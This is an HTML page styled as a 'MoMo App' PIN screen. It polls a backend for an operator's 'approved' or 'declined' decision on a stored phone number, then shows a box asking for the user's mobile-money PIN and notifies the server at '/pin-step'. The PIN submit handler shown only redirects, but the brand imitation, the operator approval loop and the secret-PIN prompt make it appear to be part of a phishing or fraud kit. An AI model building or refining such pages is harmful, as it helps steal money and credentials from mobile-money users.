<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo PIN</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #0b5c6b;
  color: white;
  text-align: center;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  font-size: 20px;
  font-weight: bold;
}

.container {
  background: white;
  color: black;
  max-width: 350px;
  margin: 40px auto;
  padding: 25px;
  border-radius: 15px;
  display: none;
}

input {
  width: 100%;
  padding: 15px;
  margin-top: 15px;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
  text-align: center;
  font-size: 18px;
  letter-spacing: 5px;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
}

.status {
  margin-top: 80px;
  font-size: 16px;
}
</style>
</head>

<body>

<div class="header">
  MoMo App
</div>

<!-- STATUS -->
<div id="statusBox" class="status">
  ⏳ Waiting for approval...
</div>

<!-- PIN BOX -->
<div class="container" id="pinContainer">
  <h3>Enter MoMo PIN</h3>

  <p id="phoneDisplay"></p>

  <form id="pinForm">
    <input type="password" maxlength="6" placeholder="Enter PIN" required>
    <button type="submit" id="pinBtn">Confirm</button>
  </form>
</div>

<script>
const phone = localStorage.getItem("phone");

// if no phone → go back
if (!phone) {
  window.location.href = "/";
}

const statusBox = document.getElementById("statusBox");
const pinContainer = document.getElementById("pinContainer");

// STATUS CHECK LOOP
async function checkStatus() {
  try {
    const res = await fetch("/status/" + phone);
    const data = await res.json();

    if (data.status === "pending") {
      statusBox.innerHTML = "⏳ Waiting for approval...";
      setTimeout(checkStatus, 3000);
    }

    else if (data.status === "declined") {
      statusBox.innerHTML = "❌ Application Declined";
    }

    else if (data.status === "approved") {
      statusBox.style.display = "none";
      pinContainer.style.display = "block";

      document.getElementById("phoneDisplay").innerText = "Number: " + phone;

      // notify backend once
      fetch("/pin-step", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ phone })
      });
    }

    else {
      statusBox.innerHTML = "⚠️ Unknown status";
      setTimeout(checkStatus, 3000);
    }

  } catch (err) {
    console.log(err);
    statusBox.innerHTML = "⚠️ Network error...";
    setTimeout(checkStatus, 3000);
  }
}

// start checking
checkStatus();

// PIN submit (UI only)
document.getElementById("pinForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const btn = document.getElementById("pinBtn");
  btn.innerText = "Verifying...";
  btn.disabled = true;

  setTimeout(() => {
    window.location.href = "/success.html";
  }, 1500);
});
</script>

</body>
</html>
